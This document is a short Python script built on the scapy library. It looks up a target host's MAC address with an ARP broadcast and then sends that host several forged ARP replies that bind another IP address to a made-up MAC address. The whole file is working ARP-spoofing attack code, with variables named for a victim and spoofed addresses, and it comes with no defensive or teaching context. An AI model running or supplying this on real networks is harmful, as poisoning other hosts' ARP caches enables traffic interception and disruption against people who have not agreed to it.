from scapy.all import srp, Ether, ARP, sendp, conf

iface = "eth0"                # change to your interface (or leave out and use conf.iface)
conf.iface = iface

victim_ip = "10.0.0.2"
spoof_ip = "10.0.0.42"
spoof_mac = "42:42:42:42:42:42"

# 1) discover victim MAC (ARP who-has)
ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip), timeout=2, iface=iface, verbose=False)
if not ans:
    raise SystemExit("No ARP reply from victim; can't determine its MAC")

victim_mac = ans[0][1][ARP].hwsrc
print(f"victim {victim_ip} has MAC {victim_mac}")
print(f"spoofed_data {spoof_ip} has MAC {spoof_mac}")
# 2) build and send ARP reply (op=2 -> is-at)
arp_reply = Ether(dst=victim_mac)/ARP(op=2,
                                      psrc=spoof_ip,  # IP we're claiming
                                      hwsrc=spoof_mac, # MAC we're claiming for that IP
                                      pdst=victim_ip,
                                      hwdst=victim_mac)

# send it a few times
sendp(arp_reply, iface=iface, count=3, inter=0.2)
print("Spoofed ARP reply sent")

